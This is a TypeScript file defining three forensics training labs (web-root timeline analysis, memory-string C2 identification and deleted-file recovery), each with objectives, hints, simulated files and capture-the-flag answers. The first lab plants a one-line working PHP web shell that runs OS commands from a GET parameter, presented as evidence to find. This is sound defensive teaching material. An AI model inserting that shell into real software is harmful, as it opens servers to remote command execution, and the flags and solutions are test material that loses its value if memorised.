import { dir, file } from '../vfs';
import type { LabScenario } from '../types';

export const forensicsLabs: LabScenario[] = [
  {
    id: 'forensics-timeline-analysis',
    title: 'Forensics: Timeline Analysis',
    difficulty: 'Easy',
    category: 'Forensics',
    briefing:
      'Meridian Retail\'s web root was imaged after a suspected compromise. The whole site was deployed in a ' +
      'single release, so any file touched after that point is worth explaining — but "touched after deploy" ' +
      'is not proof of compromise by itself, since IT approves plenty of small post-release patches through ' +
      'its own change-management process. Your job is to find every file modified after the deploy, then check ' +
      'IT\'s change log to see which of those modifications actually has a paper trail — and which one doesn\'t.',
    objectives: [
      {
        text: 'ls -la /var/www/html to see the deployed site\'s file listing',
        why: 'A production web root deployed from one release should have a small, predictable set of files — confirming what "normal" looks like here is the baseline everything else in this investigation gets compared against.',
      },
      {
        text: 'grep -r "modified" /var/www/html to find every file carrying a post-deployment modification marker',
        why: 'Recursively filtering the whole web root for the modification marker — instead of opening every file one by one — surfaces exactly the files that changed after go-live. In a real image this replaces manually diffing mtimes across thousands of files.',
      },
      {
        text: 'cat /var/log/change-management/approved-changes.log and check whether each modified file has a matching ticket',
        why: 'A file changing after deployment is only suspicious if nobody approved it. Cross-referencing IT\'s own change log is what separates a legitimate emergency patch from an unauthorized modification, instead of guessing purely from a filename.',
      },
      {
        text: 'cat /var/www/html/wp-config-cache.php to confirm the unticketed file is a web shell and capture the flag',
        why: 'Only after ruling out a legitimate explanation should you treat the file as hostile. Reading it now confirms it accepts and executes attacker-supplied commands, which is what actually justifies isolating the host.',
      },
    ],
    hints: [
      'ls -la /var/www/html — most files are untouched since deploy; only two carry a modification marker.',
      'grep -r "modified" /var/www/html — narrows the whole directory down to exactly the two changed files.',
      'grep "cache-utils.php" /var/log/change-management/approved-changes.log, then grep "wp-config-cache.php" /var/log/change-management/approved-changes.log — one returns a ticket, the other returns nothing at all.',
      'cat /var/www/html/wp-config-cache.php — the file with no matching ticket is the one worth reading in full.',
    ],
    totalFlags: 1,
    attacker: {
      hostname: 'forensics-ws',
      user: 'root',
      root: dir({
        var: dir({
          www: dir({
            html: dir({
              'index.php': file(
                '-- deployed 2026-07-10 14:02:00 as part of release RLS-2026-07-10 --\n<?php echo "Welcome"; ?>\n',
                '-rw-r--r--',
              ),
              'about.php': file(
                '-- deployed 2026-07-10 14:02:00 as part of release RLS-2026-07-10 --\n<?php echo "About us"; ?>\n',
                '-rw-r--r--',
              ),
              'contact.php': file(
                '-- deployed 2026-07-10 14:02:00 as part of release RLS-2026-07-10 --\n<?php echo "Contact"; ?>\n',
                '-rw-r--r--',
              ),
              'cache-utils.php': file(
                '-- modified 2026-07-11 09:14:00 --\n' +
                  '<?php\n' +
                  '// bumped object-cache TTL from 300s to 900s\n' +
                  'define("CACHE_TTL", 900);\n' +
                  '?>\n',
                '-rw-r--r--',
              ),
              'wp-config-cache.php': file(
                '-- modified 2026-07-12 03:47:12 --\n' +
                  '<?php\n' +
                  'if(isset($_GET["cmd"])){system($_GET["cmd"]);}\n' +
                  '?>\n' +
                  '// Incident SOC-3391: this file executes arbitrary OS commands via a GET parameter, and no matching change ticket exists for it.\n' +
                  '// flag{unauthorized_change_no_matching_ticket_wp_config_cache}\n',
                '-rw-r--r--',
              ),
            }),
          }),
          log: dir({
            'change-management': dir({
              'approved-changes.log': file(
                [
                  'Meridian Retail — IT Change Management Log (production web tier)',
                  'Format: TICKET | TIMESTAMP | STATUS | file | reason | approved_by',
                  'CHG-4450 | 2026-07-08 10:00 | approved | file: robots.txt | reason: update crawler rules | approved_by: M.Chen',
                  'CHG-4461 | 2026-07-09 15:30 | approved | file: footer.tpl | reason: update copyright year | approved_by: J.Ortiz',
                  'CHG-4463 | 2026-07-09 16:05 | approved | file: style.css | reason: rebrand color palette | approved_by: J.Ortiz',
                  'CHG-4471 | 2026-07-11 09:10 | approved | file: cache-utils.php | reason: increase object-cache TTL from 300s to 900s | approved_by: J.Ortiz',
                  'CHG-4472 | 2026-07-11 09:45 | approved | file: header.tpl | reason: add cookie consent banner | approved_by: M.Chen',
                  'CHG-4480 | 2026-07-12 08:00 | approved | file: checkout.php | reason: fix rounding bug in tax calc | approved_by: R.Alvarez',
                  'CHG-4481 | 2026-07-12 08:20 | approved | file: sitemap.xml | reason: regenerate sitemap | approved_by: automation',
                  'CHG-4482 | 2026-07-12 09:00 | approved | file: about.php | reason: update leadership bios | approved_by: M.Chen',
                ].join('\n'),
              ),
            }),
          }),
        }),
      }),
    },
    network: [],
  },
  {
    id: 'forensics-memory-strings',
    title: 'Forensics: Memory Dump String Extraction',
    difficulty: 'Medium',
    category: 'Forensics',
    briefing:
      'A memory dump was captured from a suspected-compromised workstation. In real forensics you would run ' +
      '`strings` against the raw memory image; here that same textual output has already been extracted for ' +
      'you. It contains several outbound-URL indicators, but memory strings alone cannot tell you which one is ' +
      'an active C2 beacon and which are cached, entirely legitimate traffic — you\'ll need a network-connections ' +
      'snapshot taken at capture time and the SOC\'s threat-intelligence feed to actually confirm it.',
    objectives: [
      {
        text: 'grep -i "http" ~/memdump_strings.txt',
        why: 'Extracted memory strings mix a handful of real network indicators with a large amount of loaded-library and API-call noise — filtering for URL-like strings surfaces every outbound destination the process touched without reading dozens of irrelevant lines.',
      },
      {
        text: 'cat ~/network-connections.txt and compare it against the URLs found in memory',
        why: 'Not every string in a memory dump reflects a connection that was actually active — some are cached or historical. A netstat-style snapshot from capture time shows which destination was genuinely ESTABLISHED, and from which process, narrowing three candidates down to one.',
      },
      {
        text: 'grep "185.220.101.47" ~/threat-intel-feed.txt (and, for comparison, the other candidate IPs)',
        why: 'Confirming an IP against curated threat intelligence — rather than assuming any raw-IP URL is malicious — is what separates a defensible incident conclusion from a guess. Two of the three candidates in this case turn out to be ordinary CDN and cloud-telemetry infrastructure.',
      },
      {
        text: 'cat ~/threat-intel-feed.txt to read the confirmed-malicious entry in full and capture the flag',
        why: 'Only the destination that is both actively connected AND flagged by threat intel should be escalated as confirmed C2 — that three-way correlation is exactly what a real SOC memory-forensics writeup has to show its work on.',
      },
    ],
    hints: [
      'grep -i "http" ~/memdump_strings.txt — isolates three URL-like strings out of roughly twenty noise lines.',
      'cat ~/network-connections.txt — only one of those three destinations shows State=ESTABLISHED at capture time, and it\'s a process that has no normal reason to be reaching out to a raw IP.',
      'grep "185.220.101.47" ~/threat-intel-feed.txt — check the actively-connected IP specifically against the intel feed; try the other two candidate IPs too and see why they come back clean.',
      'cat ~/threat-intel-feed.txt — read the full feed to see the confirmed-malicious entry and capture the flag.',
    ],
    totalFlags: 1,
    attacker: {
      hostname: 'forensics-ws',
      user: 'root',
      root: dir({
        root: dir({
          'memdump_strings.txt': file(
            [
              'kernel32.dll',
              'ntdll.dll',
              'C:\\Windows\\System32\\svchost.exe',
              'GetProcAddress',
              'VirtualAllocEx',
              'WriteProcessMemory',
              'CreateRemoteThread',
              'user32.dll',
              'advapi32.dll',
              'chrome.exe',
              'outlook.exe',
              'GET /favicon.ico HTTP/1.1',
              'www.google.com',
              'login.microsoftonline.com',
              'http://23.216.147.64:80/akamai/update.bin',
              'GetModuleHandleA',
              'http://40.90.23.10:443/office/telemetry',
              'RegOpenKeyExA',
              'http://185.220.101.47:8443/gate.php?id=WKSTN07',
              'CryptDecrypt',
              'ws2_32.dll',
              'teams.microsoft.com',
            ].join('\n'),
          ),
          'network-connections.txt': file(
            [
              'Active connections at time of memory capture (2026-07-11 22:15:00):',
              'Proto  Local Address         Foreign Address            State        PID/Process',
              'TCP    10.20.5.44:51001     23.216.147.64:80           TIME_WAIT    4102/svchost.exe',
              'TCP    10.20.5.44:51050     40.90.23.10:443            TIME_WAIT    2201/chrome.exe',
              'TCP    10.20.5.44:51102     185.220.101.47:8443        ESTABLISHED  3390/svchost.exe',
              'TCP    10.20.5.44:51110     52.113.194.132:443         ESTABLISHED  4410/teams.exe',
              '--- svchost.exe initiating and holding an outbound connection to a raw IP on 8443 is not normal behavior for that process ---',
            ].join('\n'),
          ),
          'threat-intel-feed.txt': file(
            [
              'Internal Threat Intelligence Feed — updated weekly from ISAC + commercial sources',
              '23.216.147.64   category: CDN (Akamai)                       reputation: benign',
              '40.90.23.10     category: Cloud provider (Microsoft)          reputation: benign',
              '52.113.194.132  category: Cloud provider (Microsoft Teams)    reputation: benign',
              '198.51.100.44   category: unassigned                          reputation: unknown',
              '185.220.101.47  category: Tor exit node / known C2 infrastructure   reputation: MALICIOUS — linked to multiple 2026 ransomware precursor intrusions',
              'flag{memory_strings_netstat_and_threat_intel_confirm_c2_185_220_101_47}',
            ].join('\n'),
          ),
        }),
      }),
    },
    network: [],
  },
  {
    id: 'forensics-deleted-file-recovery',
    title: 'Forensics: Deleted File Recovery',
    difficulty: 'Medium',
    category: 'Forensics',
    briefing:
      'A departing employee claims they "never downloaded anything suspicious," but trash/recycle-bin metadata ' +
      'on their machine tells a different story. Recovering the deleted content is only half the job — you ' +
      'also need the employee\'s role and IT\'s tool-authorization policy to establish that what was recovered ' +
      'was never something their job justified having in the first place.',
    objectives: [
      {
        text: "find /home -type d -name '*Trash*' to locate the trash/recycle metadata artifact",
        why: 'Deleted files are often still readable from trash metadata until the space is actually reclaimed — locating the artifact directory is the standard first step in any deleted-file recovery.',
      },
      {
        text: 'ls -la the recovered files/ directory and cat each recovered item',
        why: 'Multiple items were recovered, not just one — most deleted files on any real machine are mundane, so you have to read all of them to know which one actually matters to this case.',
      },
      {
        text: 'cat ~/case-notes.txt to establish the employee\'s role and the case timeline',
        why: 'Whether a recovered tool is suspicious depends entirely on who had it — a credential-dumping tool means something very different for an IT security engineer than for a marketing coordinator.',
      },
      {
        text: 'cat ~/it-role-tool-policy.txt to check whether that role is authorized to possess this class of tool',
        why: 'This is IT\'s own written policy on which roles may use which tool categories — citing it turns "this seems suspicious" into a documented policy violation an investigator can actually act on.',
      },
      {
        text: 'cat the deletion-index.txt metadata file to confirm the timing and capture the flag',
        why: 'The deletion timestamp lines up with the day access was revoked — combined with the role/policy mismatch, that timing is what turns a recovered file into defensible evidence for an IP-theft or policy-violation case.',
      },
    ],
    hints: [
      "find /home -type d -name '*Trash*' — locates the recovered-files artifact directory.",
      'ls -la /home/employee/.local/share/Trash-artifact/files then cat each file in it — two are mundane, one is not.',
      "cat ~/case-notes.txt — the employee's role and resignation date.",
      'cat ~/it-role-tool-policy.txt — check whether that specific role is authorized for credential-recovery tools.',
      'cat /home/employee/.local/share/Trash-artifact/info/deletion-index.txt — the deletion timestamp, and the flag.',
    ],
    totalFlags: 1,
    attacker: {
      hostname: 'forensics-ws',
      user: 'root',
      root: dir({
        root: dir({
          'case-notes.txt': file(
            [
              'Case SOC-4102 — Insider Threat / Suspected IP Theft',
              'Employee: R. Whitfield',
              'Role: Marketing Coordinator',
              'Resignation effective date: 2026-07-11. Access revoked: 2026-07-12 08:00.',
              'Investigation trigger: employee denies ever downloading "anything suspicious" from their company laptop.',
            ].join('\n'),
          ),
          'it-role-tool-policy.txt': file(
            [
              'IT Acceptable Use Policy — Tool Authorization by Role (Policy CT-14)',
              'Role: IT/Security     — authorized: credential recovery tools, password auditing tools, network scanners',
              'Role: Engineering     — authorized: dev tools, debuggers, VPN clients',
              'Role: Marketing       — authorized: design software, CMS tools, analytics dashboards',
              'Role: Finance         — authorized: accounting software, banking portals',
              'Note: any role possessing a credential-dumping / password-recovery tool without an approved exception ticket is a policy violation and must be escalated to security.',
            ].join('\n'),
          ),
        }),
        home: dir({
          employee: dir({
            '.local': dir({
              share: dir({
                'Trash-artifact': dir({
                  files: dir({
                    'meeting-notes-backup.docx.txt': file(
                      'RECOVERED FROM TRASH METADATA\nContent summary: internal marketing meeting notes, Q3 campaign planning.\n',
                    ),
                    'vacation-photo-2026.jpg.txt': file(
                      'RECOVERED FROM TRASH METADATA\nContent summary: JPEG image (personal photo), no textual content of interest.\n',
                    ),
                    'password-dumper-totally-legit.exe.txt': file(
                      'RECOVERED FROM TRASH METADATA\n' +
                        'Original file: password-dumper-totally-legit.exe\n' +
                        'File description: extracts cached credentials from browser and OS credential stores — this tool class ' +
                        'is grouped under "credential recovery / password-dumping" tools by policy CT-14.\n',
                    ),
                  }),
                  info: dir({
                    'deletion-index.txt': file(
                      [
                        'Recycle-bin metadata index (recovered from registry/filesystem artifacts):',
                        '$I001.docx  ->  /home/employee/Documents/meeting-notes-backup.docx   deleted 2026-07-09 11:20:00  by rwhitfield',
                        '$I002.jpg   ->  /home/employee/Pictures/vacation-photo-2026.jpg        deleted 2026-07-05 08:14:00  by rwhitfield',
                        '$I003.exe   ->  /home/employee/Downloads/password-dumper-totally-legit.exe   deleted 2026-07-11 22:03:09  by rwhitfield',
                        '--- password-dumper-totally-legit.exe was deleted less than 2 hours before resignation, same day access was revoked ---',
                        '--- role=Marketing Coordinator is not authorized for credential-dumping tools per policy CT-14, with no exception ticket on file ---',
                        'flag{deleted_credential_tool_violates_role_policy_ct14}',
                      ].join('\n'),
                    ),
                  }),
                }),
              }),
            }),
          }),
        }),
      }),
    },
    network: [],
  },
];
